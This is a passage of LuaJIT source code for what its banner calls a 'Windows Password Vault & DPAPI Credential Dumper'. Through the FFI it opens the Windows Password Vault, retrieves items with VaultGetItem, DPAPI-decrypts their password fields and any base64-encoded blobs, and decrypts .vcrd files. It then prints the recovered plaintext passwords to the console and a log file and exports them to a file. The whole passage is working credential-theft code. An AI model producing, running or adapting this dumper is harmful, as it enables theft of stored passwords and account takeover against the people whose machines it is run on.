                tonumber(vault_guid.Data4[2]), tonumber(vault_guid.Data4[3]),
                tonumber(vault_guid.Data4[4]), tonumber(vault_guid.Data4[5]),
                tonumber(vault_guid.Data4[6]), tonumber(vault_guid.Data4[7])
            )
            
            if CONFIG.VERBOSE then
                print(string.format("\n[*] Opening vault: %s", guid_str))
            end
            
            local open_result = vaultcli.VaultOpenVault(vault_guid, 0, vault_handle)
            
            if open_result ~= 0 then
                if CONFIG.VERBOSE then
                    print(string.format("[!] VaultOpenVault failed with error: 0x%X", open_result))
                end
                return
            end
            
            local item_count = ffi.new("DWORD[1]")
            local items = ffi.new("void*[1]")
            
            local enum_result = vaultcli.VaultEnumerateItems(vault_handle[0], 0x200, item_count, items)
            
            if enum_result == 0 then
                log(string.format("[+] Found %d items in vault '%s'", item_count[0], get_vault_name(guid_str)))
                
                local vault_info = {
                    guid = guid_str,
                    vault_name = get_vault_name(guid_str),
                    item_count = tonumber(item_count[0]),
                    items = {}
                }
                
                -- VaultEnumerateItems with flag 0x200 returns VAULT_ITEM_7 or VAULT_ITEM_8 structures
                -- We need to use VaultGetItem to properly decrypt and retrieve each item
                if item_count[0] > 0 and items[0] ~= nil and items[0] ~= ffi.NULL then
                    
                    -- Try VAULT_ITEM_8 (Windows 8+)
                    for j = 0, item_count[0] - 1 do
                        local item_success, item_data = pcall(function()
                            -- Cast to VAULT_ITEM_8 pointer array
                            local item_ptr = ffi.cast("char*", items[0]) + (j * ffi.sizeof("VAULT_ITEM_8"))
                            local vault_item = ffi.cast("VAULT_ITEM_8*", item_ptr)
                            
                            local extracted_item = {
                                index = j + 1
                            }
                            
                            debug_log(string.format("\n=== Processing Vault Item %d ===", j + 1))
                            
                            -- Extract Schema GUID for VaultGetItem call
                            local schema_guid = nil
                            pcall(function()
                                schema_guid = vault_item.schemaId
                                extracted_item.schema_id = string.format("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
                                    tonumber(schema_guid.Data1), tonumber(schema_guid.Data2), tonumber(schema_guid.Data3),
                                    tonumber(schema_guid.Data4[0]), tonumber(schema_guid.Data4[1]),
                                    tonumber(schema_guid.Data4[2]), tonumber(schema_guid.Data4[3]),
                                    tonumber(schema_guid.Data4[4]), tonumber(schema_guid.Data4[5]),
                                    tonumber(schema_guid.Data4[6]), tonumber(schema_guid.Data4[7]))
                                debug_log(string.format("Schema ID: %s", extracted_item.schema_id))
                            end)
                            
                            -- Extract basic info from enumerated item
                            pcall(function()
                                if vault_item.friendlyName ~= nil and vault_item.friendlyName ~= ffi.NULL then
                                    extracted_item.friendly_name = wstring_to_string(vault_item.friendlyName)
                                    debug_log(string.format("Friendly Name: %s", extracted_item.friendly_name))
                                end
                            end)
                            
                            pcall(function()
                                extracted_item.last_written = filetime_to_string(vault_item.lastWritten)
                            end)
                            
                            -- Now use VaultGetItem to get the ACTUAL decrypted item
                            -- We need resource and identity from the enumerated item to pass to VaultGetItem
                            local resource_ptr = vault_item.pResourceElement
                            local identity_ptr = vault_item.pIdentityElement
                            
                            debug_log(string.format("Calling VaultGetItem with schema: %s", extracted_item.schema_id or "unknown"))
                            
                            -- Call VaultGetItem to get decrypted item
                            local decrypted_item = ffi.new("void*[1]")
                            local get_result = vaultcli.VaultGetItem(
                                vault_handle[0],
                                schema_guid,
                                resource_ptr,
                                identity_ptr,
                                nil,  -- pPackageSid
                                ffi.NULL,  -- hwndOwner
                                0,  -- dwFlags
                                decrypted_item
                            )
                            
                            debug_log(string.format("VaultGetItem result: 0x%X", get_result))
                            
                            if get_result == 0 and decrypted_item[0] ~= nil and decrypted_item[0] ~= ffi.NULL then
                                debug_log("VaultGetItem succeeded! Parsing decrypted item...")
                                
                                -- Cast the returned item to VAULT_ITEM_8
                                local decrypted = ffi.cast("VAULT_ITEM_8*", decrypted_item[0])
                                
                                -- Extract Resource from decrypted item
                                pcall(function()
                                    if decrypted.pResourceElement ~= nil and decrypted.pResourceElement ~= ffi.NULL then
                                        debug_log("Extracting Resource from decrypted item...")
                                        local res_val = get_vault_item_value(decrypted.pResourceElement.data)
                                        if res_val then
                                            if type(res_val) == "table" then
                                                extracted_item.resource = string.format("[%s data]", res_val.type or "unknown")
                                            else
                                                extracted_item.resource = tostring(res_val)
                                                debug_log(string.format("Resource: %s", extracted_item.resource))
                                            end
                                        end
                                    end
                                end)
                                
                                -- Extract Identity from decrypted item
                                pcall(function()
                                    if decrypted.pIdentityElement ~= nil and decrypted.pIdentityElement ~= ffi.NULL then
                                        debug_log("Extracting Identity from decrypted item...")
                                        local id_val = get_vault_item_value(decrypted.pIdentityElement.data)
                                        if id_val then
                                            if type(id_val) == "table" then
                                                extracted_item.identity = string.format("[%s data]", id_val.type or "unknown")
                                            else
                                                extracted_item.identity = tostring(id_val)
                                                debug_log(string.format("Identity: %s", extracted_item.identity))
                                            end
                                        end
                                    end
                                end)
                                
                                -- Extract Authenticator (PASSWORD!) from decrypted item
                                pcall(function()
                                    if decrypted.pAuthenticatorElement ~= nil and decrypted.pAuthenticatorElement ~= ffi.NULL then
                                        debug_log("Extracting Authenticator (password) from decrypted item...")
                                        local auth_elem = decrypted.pAuthenticatorElement
                                        debug_log(string.format("Authenticator element type: %d", tonumber(auth_elem.data.dwType)))
                                        
                                        -- Dump raw bytes of the VAULT_ITEM_DATA structure for debugging
                                        local data_ptr = ffi.cast("uint8_t*", auth_elem.data)
                                        local hex_dump = {}
                                        for i = 0, math.min(127, 31) do
                                            table.insert(hex_dump, string.format("%02X", data_ptr[i]))
                                        end
                                        debug_log(string.format("Authenticator data raw bytes (first 32): %s", table.concat(hex_dump, " ")))
                                        
                                        local auth_val = get_vault_item_value(auth_elem.data)
                                        
                                        if auth_val then
                                            debug_log(string.format("Authenticator value type: %s", type(auth_val)))
                                            
                                            if type(auth_val) == "table" and auth_val.type == "byte_array" then
                                                debug_log(string.format("Authenticator is byte array (%d bytes), attempting DPAPI decryption...", auth_val.size))
                                                
                                                -- Log the buffer for analysis
                                                debug_log(string.format("Byte array hex (first 64 bytes): %s", auth_val.hex:sub(1, 191)))
                                                
                                                -- Try DPAPI decryption on the decrypted vault data
                                                local dpapi_decrypted, descr = dpapi_decrypt(auth_val.data, auth_val.size, 
                                                    extracted_item.friendly_name or extracted_item.resource or "vault_item")
                                                
                                                if dpapi_decrypted then
                                                    extracted_item.password = dpapi_decrypted
                                                    extracted_item.password_decrypted = true
                                                    if descr then
                                                        extracted_item.dpapi_description = descr
                                                    end
                                                    log(string.format("[+] Successfully decrypted vault password for '%s'", 
                                                        extracted_item.friendly_name or extracted_item.resource or "vault item"))
                                                    debug_log(string.format("Decrypted password: %s", dpapi_decrypted))
                                                else
                                                    -- Store encrypted buffer for later analysis
                                                    extracted_item.password_hex = auth_val.hex
                                                    extracted_item.password_size = auth_val.size
                                                    extracted_item.password_decrypted = false
                                                    log(string.format("[!] DPAPI decryption failed for vault item '%s' - storing encrypted buffer (%d bytes)", 
                                                        extracted_item.friendly_name or extracted_item.resource or "vault item", auth_val.size))
                                                    debug_log("Password is encrypted byte array (DPAPI decryption failed) - buffer stored for analysis")
                                                end
                                            else
                                                -- Plain text password from vault
                                                local pwd_str = tostring(auth_val)
                                                debug_log(string.format("Got authenticator as string (%d chars)", #pwd_str))
                                                
                                                -- Check if it's base64-encoded DPAPI data (long string, likely encrypted)
                                                -- DPAPI blobs are typically 100+ chars when base64 encoded
                                                local is_likely_base64_dpapi = #pwd_str > 100 and pwd_str:match("^[A-Za-z0-9+/]+=*$")
                                                
                                                if is_likely_base64_dpapi then
                                                    log(string.format("[*] Password appears to be base64-encoded DPAPI blob (%d chars), attempting decode and decrypt...", #pwd_str))
                                                    debug_log(string.format("Base64 string (first 100 chars): %s...", pwd_str:sub(1, 100)))
                                                    
                                                    -- Decode base64
                                                    local decoded = decode_base64(pwd_str)
                                                    if decoded and #decoded > 0 then
                                                        debug_log(string.format("Base64 decoded to %d bytes", #decoded))
                                                        
                                                        -- Log the decoded buffer in hex for analysis
                                                        local hex_preview = {}
                                                        for i = 1, math.min(32, #decoded) do
                                                            table.insert(hex_preview, string.format("%02X", decoded:byte(i)))
                                                        end
                                                        debug_log(string.format("Decoded buffer (first 32 bytes): %s", table.concat(hex_preview, " ")))
                                                        
                                                        -- Try DPAPI decrypt on decoded data
                                                        local dpapi_pwd, dpapi_desc = dpapi_decrypt(decoded, #decoded,
                                                            extracted_item.friendly_name or extracted_item.resource or "vault_base64")
                                                        
                                                        if dpapi_pwd then
                                                            extracted_item.password = dpapi_pwd
                                                            extracted_item.password_decrypted = true
                                                            if dpapi_desc then
                                                                extracted_item.dpapi_description = dpapi_desc
                                                            end
                                                            log(string.format("[+] Successfully decrypted base64 DPAPI password for '%s'", 
                                                                extracted_item.friendly_name or extracted_item.resource or "vault item"))
                                                            debug_log(string.format("Decrypted password: %s", dpapi_pwd))
                                                        else
                                                            -- DPAPI failed, store the encrypted buffer
                                                            extracted_item.password_encrypted_base64 = pwd_str
                                                            extracted_item.password_encrypted_binary = decoded
                                                            extracted_item.password_size = #decoded
                                                            extracted_item.password_decrypted = false
                                                            log(string.format("[!] Base64 DPAPI decryption failed for vault item '%s' - storing encrypted data", 
                                                                extracted_item.friendly_name or extracted_item.resource or "vault item"))
                                                            debug_log("Base64 decode succeeded but DPAPI decryption failed - encrypted buffer stored")
                                                        end
                                                    else
                                                        extracted_item.password = pwd_str
                                                        extracted_item.password_decrypted = false
                                                        debug_log("Base64 decode failed - storing as-is")
                                                    end
                                                else
                                                    -- Plain text password
                                                    extracted_item.password = pwd_str
                                                    extracted_item.password_decrypted = false
                                                    debug_log(string.format("Got plaintext password: %s", pwd_str))
                                                end
                                            end
                                        else
                                            debug_log("Authenticator get_vault_item_value returned nil!")
                                        end
                                    else
                                        debug_log("Authenticator element is NULL in decrypted item")
                                    end
                                end)
                                
                                -- Free the decrypted item
                                pcall(function() vaultcli.VaultFree(decrypted_item[0]) end)
                                
                                return extracted_item
                            else
                                debug_log(string.format("VaultGetItem failed or returned NULL (error: 0x%X)", get_result))
                                -- Keep item with basic info even if VaultGetItem fails
                                -- Applications may restrict access to their vault items from other contexts
                                if get_result == 0x490 then
                                    debug_log("Item not found (0x490) - application may restrict access to this credential")
                                    log(string.format("[!] Vault item %d access denied (0x490) - app-restricted credential", j + 1))
                                elseif get_result == 0x80070005 then
                                    debug_log("Access denied (0x80070005) - insufficient permissions")
                                    log(string.format("[!] Vault item %d access denied (0x80070005) - insufficient permissions", j + 1))
                                else
                                    log(string.format("[!] Vault item %d failed to decrypt (error: 0x%X)", j + 1, get_result))
                                end
                                extracted_item.vault_access_error = string.format("0x%X", get_result)
                                extracted_item.vault_access_denied = true
                                return extracted_item  -- Return with basic info
                            end
                            
                            return extracted_item
                        end)
                        
                        if item_success and item_data then
                            table.insert(vault_info.items, item_data)
                            log(string.format("  [Item %d] %s", j + 1, item_data.friendly_name or item_data.resource or "N/A"))
                        else
                            debug_log(string.format("Failed to parse vault item %d: %s", j, tostring(item_data)))
                        end
                    end
                    
                    pcall(function() vaultcli.VaultFree(items[0]) end)
                end
                
                table.insert(vaults_data, vault_info)

            else
                if CONFIG.VERBOSE then
                    print(string.format("[!] VaultEnumerateItems failed with error: 0x%X", enum_result))
                end
            end
            
            vaultcli.VaultCloseVault(vault_handle[0])
        end)
        
        if not success and CONFIG.VERBOSE then
            print(string.format("[!] Error processing vault %d: %s", i, err))
        end
    end
    
    if vault_guids[0] ~= nil and vault_guids[0] ~= ffi.NULL then
        pcall(function() vaultcli.VaultFree(vault_guids[0]) end)
    end
    
    return vaults_data
end

-- Display Results
local function display_credentials(credentials)
    log("\n" .. string.rep("=", 80))
    log("CREDENTIAL MANAGER DUMP")
    log(string.rep("=", 80))
    
    for i, cred in ipairs(credentials) do
        log(string.format("\n[Credential #%d]", i))
        log(string.format("  Target:       %s", cred.target or "N/A"))
        log(string.format("  Username:     %s", cred.username or "N/A"))
        log(string.format("  Type:         %s", cred.type))
        log(string.format("  Persist:      %s", cred.persist))
        log(string.format("  Last Written: %s", cred.last_written))
        
        if cred.comment then
            log(string.format("  Comment:      %s", cred.comment))
        end
        
        if cred.password then
            log(string.format("  Password:     %s", cred.password))
            log(string.format("  Decrypted:    %s", cred.decrypted and "Yes (DPAPI)" or "No (Plaintext)"))
            if cred.dpapi_description then
                log(string.format("  DPAPI Descr:  %s", cred.dpapi_description))
            end
            if cred.password_base64_decoded then
                log(string.format("  Base64 Dec:   %s", cred.password_base64_decoded))
            end
        elseif cred.password_hexdump then
            log(string.format("  Password:     [Binary Data - %d bytes]", cred.blob_size))
            log("  Hexdump:")
            for line in cred.password_hexdump:gmatch("[^\n]+") do
                log("    " .. line)
            end
        end
        
        if cred.attributes and #cred.attributes > 0 then
            log("  Attributes:")
            for j, attr in ipairs(cred.attributes) do
                log(string.format("    [%d] %s (%d bytes) - Decrypted: %s", 
                    j, attr.keyword or "N/A", 
                    attr.value_size,
                    attr.decrypted and "Yes" or "No"))
                
                if attr.value then
                    -- Truncate long values for display
                    local display_value = attr.value
                    if #display_value > 200 then
                        display_value = display_value:sub(1, 200) .. "... [truncated]"
                    end
                    log(string.format("        Value: %s", display_value))
                elseif attr.value_hexdump then
                    log("        Hexdump:")
                    for line in attr.value_hexdump:gmatch("[^\n]+") do
                        log("          " .. line)
                    end
                end
            end
        end
    end
    
    log("\n" .. string.rep("=", 80))
    log(string.format("Total Credentials: %d", #credentials))
    log(string.rep("=", 80))
end

local function display_vaults(vaults)
    log("\n" .. string.rep("=", 80))
    log("PASSWORD VAULT DUMP")
    log(string.rep("=", 80))
    
    local total_items = 0
    
    for i, vault in ipairs(vaults) do
        log(string.format("\n[Vault #%d]", i))
        log(string.format("  GUID:         %s", vault.guid))
        if vault.vault_name then
            log(string.format("  Type:         %s", vault.vault_name))
        end
        log(string.format("  Item Count:   %d", vault.item_count or 0))
        
        if vault.items and #vault.items > 0 then
            log("\n  Vault Items:")
            for j, item in ipairs(vault.items) do
                log(string.format("\n    [Item #%d]", j))
                
                if item.friendly_name then
                    log(string.format("      Name:         %s", item.friendly_name))
                end
                
                if item.schema_id then
                    log(string.format("      Schema ID:    %s", item.schema_id))
                end
                
                if item.last_written then
                    log(string.format("      Last Written: %s", item.last_written))
                end
                
                if item.resource then
                    log(string.format("      Resource:     %s", tostring(item.resource)))
                end
                
                if item.identity then
                    log(string.format("      Identity:     %s", tostring(item.identity)))
                end
                
                if item.password then
                    log(string.format("      Password:     %s", item.password))
                    log(string.format("      Decrypted:    %s", item.password_decrypted and "Yes (DPAPI)" or "No"))
                    if item.dpapi_description then
                        log(string.format("      DPAPI Descr:  %s", item.dpapi_description))
                    end
                elseif item.password_hex then
                    log(string.format("      Password:     [Binary Data - %d bytes]", item.password_size or 0))
                    log("      Hexdump:")
                    for line in item.password_hex:gmatch("[^\n]+") do
                        log("        " .. line)
                    end
                elseif item.password_encrypted_base64 then
                    -- Show encrypted base64 DPAPI blob that failed to decrypt
                    log(string.format("      Password:     [ENCRYPTED - %d bytes, DPAPI decryption failed]", item.password_size or 0))
                    log("      Encrypted (base64):")
                    -- Split into 80-char lines for readability
                    local b64 = item.password_encrypted_base64
                    for i = 1, #b64, 80 do
                        log("        " .. b64:sub(i, i + 79))
                    end
                    if item.password_encrypted_binary then
                        -- Show hex dump of first 64 bytes
                        log("      Encrypted (hex, first 64 bytes):")
                        local hex_line = {}
                        for i = 1, math.min(64, #item.password_encrypted_binary) do
                            table.insert(hex_line, string.format("%02X", item.password_encrypted_binary:byte(i)))
                            if #hex_line == 16 then
                                log("        " .. table.concat(hex_line, " "))
                                hex_line = {}
                            end
                        end
                        if #hex_line > 0 then
                            log("        " .. table.concat(hex_line, " "))
                        end
                    end
                    log("      Note:         Run from within application context to decrypt")
                elseif item.vault_access_denied then
                    log(string.format("      Password:     [ACCESS DENIED - Error %s]", item.vault_access_error or "unknown"))
                    log("      Note:         Application-restricted credential, run from app context to access")
                else
                    log("      Password:     [Not Available]")
                    log("      Note:         No authenticator element found")
                end
                
                total_items = total_items + 1
            end
        end
    end
    
    log("\n" .. string.rep("=", 80))
    log(string.format("Total Vaults: %d | Total Items: %d", #vaults, total_items))
    log(string.rep("=", 80))
end

local function export_results(credentials, vaults, filename)
    local file = io.open(filename, "w")
    if not file then
        print(string.format("[!] Failed to open export file: %s", filename))
        return
    end
    
    file:write("Windows Credential Dump\n")
    file:write(string.format("Generated: %s\n\n", os.date("%Y-%m-%d %H:%M:%S")))
    
    file:write(string.rep("=", 80) .. "\n")
    file:write("CREDENTIAL MANAGER\n")
    file:write(string.rep("=", 80) .. "\n\n")
    
    for i, cred in ipairs(credentials) do
        file:write(string.format("[Credential #%d]\n", i))
        file:write(string.format("Target: %s\n", cred.target or "N/A"))
        file:write(string.format("Username: %s\n", cred.username or "N/A"))
        file:write(string.format("Type: %s\n", cred.type))
        file:write(string.format("Password: %s\n", cred.password or "[Binary/Encrypted]"))
        file:write("\n")
    end
    
    file:write(string.rep("=", 80) .. "\n")
    file:write("PASSWORD VAULTS\n")
    file:write(string.rep("=", 80) .. "\n\n")
    
    for i, vault in ipairs(vaults) do
        file:write(string.format("[Vault #%d]\n", i))
        file:write(string.format("GUID: %s\n", vault.guid))
        file:write(string.format("Items: %d\n\n", vault.item_count or 0))
    end
    
    file:close()
    print(string.format("\n[+] Results exported to: %s", filename))
end

-- Main Execution
local function main()
    print([[
================================================================================
    Windows Password Vault & DPAPI Credential Dumper
    Extracts credentials from Windows Credential Manager and Password Vault
================================================================================
]])
    
    -- Initialize logging
    init_log()
    
    log("[*] Starting credential dump...")
    log(string.format("[*] Verbose: %s, Debug DPAPI: %s, Search VCRD: %s", 
        tostring(CONFIG.VERBOSE), tostring(CONFIG.DEBUG_DPAPI), tostring(CONFIG.SEARCH_VCRD)))
    
    -- Enumerate credentials
    local credentials = enumerate_credentials()
    
    -- Enumerate vaults
    local vaults = enumerate_vaults()
    
    -- Search for .vcrd files
    local vcrd_data = {}
    if CONFIG.SEARCH_VCRD then
        local vcrd_files = find_vcrd_files()
        
        for _, filepath in ipairs(vcrd_files) do
            local data = decrypt_vcrd_file(filepath)
            if data then
                table.insert(vcrd_data, data)
            end
        end
    end
    
    -- Display results
    display_credentials(credentials)
    display_vaults(vaults)
    
    -- Display VCRD results
    if #vcrd_data > 0 then
        log("\n" .. string.rep("=", 80))
        log("VCRD FILE DUMP")
        log(string.rep("=", 80))
        
        for i, vcrd in ipairs(vcrd_data) do
            log(string.format("\n[VCRD File #%d]", i))
            log(string.format("  Path:         %s", vcrd.filepath))
            log(string.format("  Size:         %d bytes", vcrd.size))
            
            if vcrd.decrypted then
                log("  Status:       Successfully Decrypted")
                if vcrd.description then
                    log(string.format("  Description:  %s", vcrd.description))
                end
                
                -- Display decrypted content
                if is_printable(ffi.cast("uint8_t*", vcrd.decrypted), #vcrd.decrypted) then
                    log(string.format("  Content:      %s", vcrd.decrypted))
                else
                    log("  Content (Hex):")
                    local hd = hexdump(ffi.cast("uint8_t*", vcrd.decrypted), #vcrd.decrypted)
                    for line in hd:gmatch("[^\n]+") do
                        log("    " .. line)
                    end
                end
            else
                log("  Status:       Decryption Failed")
                log("  Raw Data (first 256 bytes):")
                log("    " .. vcrd.raw_hex)
            end
        end
        
        log("\n" .. string.rep("=", 80))
        log(string.format("Total VCRD Files: %d", #vcrd_data))
        log(string.rep("=", 80))
    end
    
    if CONFIG.EXPORT_FILE then
        export_results(credentials, vaults, CONFIG.EXPORT_FILE)
    end
    
    log(string.format("\n[*] Dump completed successfully"))
    log(string.format("[*] Log file saved to: %s", LOG_PATH))
    
    if LOG_FILE then
        LOG_FILE:close()
    end
end

-- Execute
local status, err = pcall(main)
if not status then
    print(string.format("\n[!] Error: %s", err))
    print("[!] Make sure you're running with appropriate privileges")
end
